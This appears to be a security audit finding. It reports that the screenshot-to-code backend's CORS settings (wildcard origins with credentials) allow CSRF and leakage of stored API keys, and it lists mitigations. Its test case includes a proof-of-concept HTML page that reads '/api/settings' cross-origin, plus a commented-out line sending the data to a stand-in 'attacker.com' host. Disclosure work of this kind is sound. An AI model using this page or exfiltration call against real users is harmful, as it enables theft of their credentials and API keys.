# VULNERABILITIES

## CORS Misconfiguration Leading to CSRF and Information Leakage

### Vulnerability name
CORS Misconfiguration Leading to CSRF and Information Leakage

### Description
The backend has a CORS configuration that allows any origin (`allow_origins=["*"]`) while simultaneously allowing credentials (`allow_credentials=True`). This combination explicitly violates CORS security specifications. An attacker can create a malicious website that makes authenticated requests to the application's API endpoints when a victim visits the attacker's site. Since the CORS configuration permits cross-origin requests with credentials, the browser will include the user's authentication cookies or other credentials in these requests.

Step by step exploitation:
1. An attacker creates a malicious webpage that contains JavaScript code making requests to the screenshot-to-code backend API
2. The victim visits this malicious webpage while already being authenticated to the screenshot-to-code application in another tab
3. The malicious JavaScript makes requests to the backend API endpoints with the victim's credentials automatically included
4. The backend accepts these requests due to the misconfigured CORS policy
5. The attacker can access sensitive information or perform actions on behalf of the user

### Impact
This vulnerability enables cross-site request forgery (CSRF) attacks and information leakage. An attacker could:
- Access the victim's API settings, potentially stealing API keys for OpenAI, Anthropic, and other services
- Use the victim's API keys to make requests to third-party services, incurring usage costs for the victim
- Access or modify any data the victim has access to within the application
- Perform actions on behalf of the victim

Since the application handles expensive API keys (OpenAI, Anthropic, etc.), this vulnerability could lead to significant financial impact for affected users if their API keys are stolen and misused.

### Vulnerability rank
High

### Currently implemented mitigations
None visible in the provided code.

### Missing mitigations
1. Modify the CORS configuration to specify explicit allowed origins instead of using the wildcard `*` when `allow_credentials` is set to `True`
2. Implement CSRF tokens for sensitive operations
3. Implement additional request validation to ensure requests come from legitimate sources
4. Consider implementing a more robust authentication mechanism that isn't vulnerable to CSRF

### Preconditions
- A user must be authenticated with the application and have credentials (like cookies) that are automatically included in cross-origin requests
- The attacker must be able to trick the user into visiting their malicious website while the user is authenticated with the screenshot-to-code application

### Source code analysis
In `main.py`, the application configures CORS settings as follows:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

This configuration violates the CORS security specification which states: "When responding to a credentialed request, the server must specify an origin in the value of the Access-Control-Allow-Origin header, instead of specifying the '*' wildcard."

The combination of `allow_origins=["*"]` and `allow_credentials=True` is particularly dangerous as it allows any website to make authenticated requests to the API, bypassing the same-origin policy that normally protects against CSRF attacks.

Additionally, the wide-open configuration of `allow_methods=["*"]` and `allow_headers=["*"]` further increases the attack surface by placing no restrictions on the types of requests that can be made cross-origin.

### Security test case
1. Set up the screenshot-to-code application locally
2. Configure API keys in the application settings
3. Create a malicious HTML file with the following content:
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Security Test</h1>
  <div id="result">Testing...</div>

  <script>
    // Attempt to access settings or API keys endpoint
    fetch('http://localhost:7001/api/settings', {
      method: 'GET',
      credentials: 'include' // Include cookies or other credentials
    })
    .then(response => response.json())
    .then(data => {
      // Display the accessed data
      document.getElementById('result').innerText = JSON.stringify(data);
      console.log('Accessed data:', data);

      // In a real attack, this would be sent to an attacker's server
      // fetch('https://attacker.com/steal', {
      //   method: 'POST',
      //   body: JSON.stringify(data)
      // });
    })
    .catch(error => {
      document.getElementById('result').innerText = 'Error: ' + error;
      console.error('Error:', error);
    });
  </script>
</body>
</html>
```
4. Open the screenshot-to-code application in a browser and authenticate/configure settings
5. In the same browser, open the malicious HTML file from a different origin (e.g., from a local file or different domain)
6. Verify that the script can successfully access the API and retrieve sensitive information like API keys
